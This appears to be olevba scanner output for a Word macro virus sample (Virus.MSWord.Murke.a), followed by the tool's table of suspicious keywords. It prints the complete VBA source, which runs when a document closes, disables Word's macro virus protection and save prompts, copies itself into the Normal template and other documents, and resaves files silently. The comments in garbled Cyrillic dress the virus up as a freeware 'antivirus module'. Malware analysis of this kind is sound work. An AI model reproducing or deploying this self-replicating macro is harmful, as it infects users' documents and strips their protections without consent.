olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Murke.a-cbf6c30dbf1ee4a652332605605aca0fc352f080
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Murke.a-cbf6c30dbf1ee4a652332605605aca0fc352f080 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'*************************************************************************
'Murka - Ýòî ñàìûé ìàëåíüêèé èç âñåõ èçâåñòíûõ ÌàêðîÀíòèâèðóñíûõ ìîäóëåé!
'Ïðèíöèï äåéñòâèÿ: Çàãðóæàåòñÿ âìåñòå ñ äîêóìåíòîì è áëîêèðóåò
'                 ðàñïðîñòðàíåíèå çàðàæåííûõ ìîäóëåé
'
'Óñëîâèÿ ðàñïðîñòðàíåíèÿ: Freeware(Ñâîáîäíî)
'Äîñòîèíñòâà:             Êîððåêòíàÿ ðàáîòà, íàäåæíîñòü!
'Íåäîñòàòêè:              Ïîêà íå íàøåë
'
'"Âñå ýòî, êîíå÷íî, õîðîøî, íî ÿ íè õðåíà íå ïîíÿë, êàê åãî
' ìîæíî ïðåîáðåñòè?!" - ãíåâíî ñêàæåøü òû. Ìîæíî!
'Äåä MustDie âàì âñå ðàñêàæåò!
'Íåîáõîäèìî ëèøü îòêðûòü äîêóìåíò íà ïåðñîíàëüíîì
'êîìïå. ãäå óæå óñòàíîâëåí àíòèâèðóñíûé ìîäóëü Murka.
'
'Àâòîðó:   mustdie@chat.ru
'Murke:    murka@chat.ru
'Äàíèëîâó: antivir@dials.ru
'*************************************************************************
On Error Resume Next
Dim s As Boolean
Dim i As Long
Dim j As Long
Dim Murka As String
Dim Other As String
Dim str As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  str = "Document_Close"
  With MacroContainer.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Murka = .Lines(i, j)
  End With
  With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      NormalTemplate.Save
    End If
  End With
  With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      Randomize
      If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka3": .Author = "M&M": .Execute: End With
      If Left(ActiveDocument.Name, 8) = "Document" Or Left(ActiveDocument.Name, 8) = "Äîêóìåíò" Then
      Else
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
      End If
    End If
  End With
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

